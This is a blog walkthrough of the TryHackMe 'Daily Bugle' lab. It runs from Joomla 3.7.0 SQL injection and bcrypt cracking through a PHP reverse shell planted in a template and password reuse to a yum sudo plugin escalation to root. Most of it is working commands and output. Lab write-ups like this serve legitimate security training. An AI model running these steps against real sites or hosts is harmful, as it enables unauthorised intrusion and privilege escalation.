---
layout: post
title:  "Tryhackme Walkthough - Daily Bugle"
date:   2021-03-05 18:50:19 -0800
categories: tryhackme
---

The introduction to the Daily Bugle room on [TryHackMe](https://tryhackme.com/room/dailybugle) states

> Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.


Beyond that there isn't much information. So let's dive right in. 

## Initial Enumeration

An NMap scan shows the following ports open. 

```
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)
```


A gobuster scan shows the following 

```
===============================================================
2021/02/26 21:13:50 Starting gobuster
===============================================================
http://10.10.239.170/images (Status: 301)
http://10.10.239.170/templates (Status: 301)
http://10.10.239.170/media (Status: 301)
http://10.10.239.170/modules (Status: 301)
http://10.10.239.170/bin (Status: 301)
http://10.10.239.170/plugins (Status: 301)
http://10.10.239.170/includes (Status: 301)
http://10.10.239.170/language (Status: 301)
http://10.10.239.170/components (Status: 301)
http://10.10.239.170/cache (Status: 301)
http://10.10.239.170/libraries (Status: 301)
http://10.10.239.170/tmp (Status: 301)
http://10.10.239.170/layouts (Status: 301)
http://10.10.239.170/administrator (Status: 301)
http://10.10.239.170/cli (Status: 301)
===============================================================
2021/02/26 22:13:34 Finished
===============================================================

```

The /administrator directory could be interesting and navigating to it shows a Joomla login page. 

![](/assets/img/20210226211916.png)


## Joomscan

While searching for Joomla exploits, I came across an utility called joomscan. 

Running this shows that the Joomla version is 3.7.0

```
(dspo6㉿kali)[~/pentest/boxes/thm/daily_bugle]$ joomscan -u http://10.10.239.170/administrator/ | tee logs/joomscan.log



    ____  _____  _____  __  __  ___   ___    __    _  _ 
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( 
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)
   
    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.239.170/administrator/ ...



[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.239.170/administrator/components
http://10.10.239.170/administrator/modules
http://10.10.239.170/administrator/templates
http://10.10.239.170/administrator/includes
http://10.10.239.170/administrator/language
http://10.10.239.170/administrator/templates


[+] Checking apache info/status files
[++] Readable info/status files are not found

[+] admin finder
[++] Admin page not found

[+] Checking robots.txt existing
[++] robots.txt is not found

[+] Finding common backup files name
[++] Backup files are not found

[+] Finding common log files name
[++] error log is not found

[+] Checking sensitive config.php.x file
[++] Readable config files are not found


Your Report : reports/10.10.239.170/
(dspo6㉿kali)[~/pentest/boxes/thm/daily_bugle]$ 
```


## Searching for Joomla Exploits

Searchsploit did show one exploit for Joomla 3.7.0 which uses sqlmap but when I tried it I was not able to get anything useful.

```
(dspo6㉿kali)[~/pentest/boxes/thm/daily_bugle]$ searchsploit joomla 3.7.0
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                               | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                            | php/webapps/43488.txt
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

I ran the search again but this time searched for 3.7 instead of 3.7.0 and got more results.


```
(dspo6㉿kali)[~/pentest/boxes/thm/daily_bugle]$ searchsploit joomla 3.7
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                           |  Path
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                                                                                              | php/remote/44227.php
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                               | php/webapps/42033.txt
Joomla! Component ARI Quiz 3.7.4 - SQL Injection                                                                         | php/webapps/46769.txt
Joomla! Component com_realestatemanager 3.7 - SQL Injection                                                              | php/webapps/38445.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                                                            | php/webapps/43488.txt
Joomla! Component J2Store < 3.3.7 - SQL Injection                                                                        | php/webapps/46467.txt
Joomla! Component JomEstate PRO 3.7 - 'id' SQL Injection                                                                 | php/webapps/44117.txt
Joomla! Component Jtag Members Directory 5.3.7 - Arbitrary File Download                                                 | php/webapps/43913.txt
Joomla! Component Quiz Deluxe 3.7.4 - SQL Injection                                                                      | php/webapps/42589.txt
------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
(dspo6㉿kali)[~/pentest/boxes/thm/daily_bugle]$ 
```

Searching the web for exploits led me to https://github.com/stefanlucas/Exploit-Joomla which is for the CVE I tried earlier with sqlmap but this time as a Python script.

The first few attempts failed. The python script kept giving errors. Looking at the Github page I noticed that there was a pull request with the change required to prevent the error. I manually update the script and was able to extract the users from the database.

```
(dspo6㉿kali)[~/pentest/boxes/thm/daily_bugle/utils]$ python3 joomblah.py http://10.10.239.170/
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$1XXXXXXXXXXXXya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
(dspo6㉿kali)[~/pentest/boxes/thm/daily_bugle/utils]$ 
```


I then used hashcat to obtain the password for the user jonah. 

```
PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1> .\hashcat.exe -a 0 -m 3200 .\target\target.hash ..\wordlists\rockyou.txt
hashcat (v6.1.1) starting...

* Device #1: CUDA SDK Toolkit installation NOT detected.
             CUDA SDK Toolkit installation required for proper device support and utilization
             Falling back to OpenCL Runtime

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
OpenCL API (OpenCL 1.2 CUDA 11.2.109) - Platform #1 [NVIDIA Corporation]
========================================================================
* Device #1: GeForce GTX 1070, 6528/8192 MB (2048 MB allocatable), 15MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 109 MB

Dictionary cache hit:
* Filename..: ..\wordlists\rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

...
...

$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:sXXXXXX123

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Fri Feb 26 20:33:56 2021 (1 min, 36 secs)
Time.Estimated...: Fri Feb 26 20:35:32 2021 (0 secs)
Guess.Base.......: File (..\wordlists\rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      492 H/s (2.51ms) @ Accel:2 Loops:4 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 46860/14344385 (0.33%)
Rejected.........: 0/46860 (0.00%)
Restore.Point....: 46530/14344385 (0.32%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1020-1024
Candidates.#1....: 199022 -> sherpa
Hardware.Mon.#1..: Temp: 58c Fan: 18% Util: 97% Core:1961MHz Mem:3802MHz Bus:16

Started: Fri Feb 26 20:33:54 2021
Stopped: Fri Feb 26 20:35:33 2021
PS D:\Google Drive\Cyber Security\Utils\hashcat-6.1.1>
```


## Logging in to Joomla

Using this password I was able to log into the Joomla administrator page. 

I have not used Joomla before but I am familiar enough with creating sites using Wordpress that I was able to find my way around. 

My plan was to create a page with a PHP reverse shell and try to get access that way. 

I navigated to the templates on the site and picked the first one. 

![](/assets/img/20210227201115.png)

![](/assets/img/20210227201143.png)

My plan was to upload the PHP Reverse Shell but that didn't work. 

![](/assets/img/20210227201203.png)

I didn't spend much time on it but instead created a new page called hello.php and pasted in the reverse  shell code. 

![](/assets/img/20210227201229.png)

I then browsed to that page http://10.10.151.238/templates/beez3/hello.php and was able to get a shell as the apache user. 

```
connect to [10.2.2.175] from (UNKNOWN) [10.10.151.238] 39208
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 19:49:12 up 24 min,  0 users,  load average: 0.00, 0.02, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$ 
```


I had a look around for other users but did not have permission to view. 

```
bash-4.2$ cd home
bash-4.2$ ls
jjameson
bash-4.2$ cd jjameson
bash: cd: jjameson: Permission denied
```

I naviagated to the web folder and checked the configuration file which happened to contain a password.

```
bash-4.2$ bash-4.2$ pwd
/var/www/html
bash-4.2$ ls     
LICENSE.txt    cli                includes   media       tmp
README.txt     components         index.php  modules     web.config.txt
administrator  configuration.php  language   plugins
bin            htaccess.txt       layouts    robots.txt
cache          images             libraries  templates
bash-4.2$ cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'The Daily Bugle';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5XXXXXXjNu';
        public $db = 'joomla';
        public $dbprefix = 'fb9j5_';
        public $live_site = '';
        public $secret = 'UAMBRWzHO3oFPmVC';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
        public $ftp_host = '127.0.0.1';
        public $ftp_port = '21';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'jonah@tryhackme.com';
        public $fromname = 'The Daily Bugle';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = 'New York City tabloid newspaper';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/administrator/logs';
        public $tmp_path = '/var/www/html/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}bash-4.2$ 
```

I wonder if this is jjamison's password. 

## SSH Login

Logging in with SSH using these credentials was successful. 

```
(dspo6㉿kali)[~]$ ssh jjameson@10.10.151.238
The authenticity of host '10.10.151.238 (10.10.151.238)' can't be established.
ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.151.238' (ECDSA) to the list of known hosts.
jjameson@10.10.151.238's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ whoami
jjameson
[jjameson@dailybugle ~]$ 
```

I checked to see if this user was allowed any sudo commands and found that the user was able to run commands on the folder `/usr/bin/yum`

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle ~]$ 
```


## Privilege Escalation

The hint on the TryHackMe page mentioned GTFOBins which led me to https://gtfobins.github.io/gtfobins/yum/

Typing in each of the commands one by one resulted in getting root access and capturing the flag. 

```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# 
sh-4.2# cd
sh-4.2# pwd
/root
sh-4.2# ls
anaconda-ks.cfg  root.txt
sh-4.2# cat root.txt
eec3dXXXXXXXXd7fa6f79
sh-4.2# 
```

## Conclusion
I really enjoyed this room. I learned a bit about exploiting Joomla and using GTFOBins. 
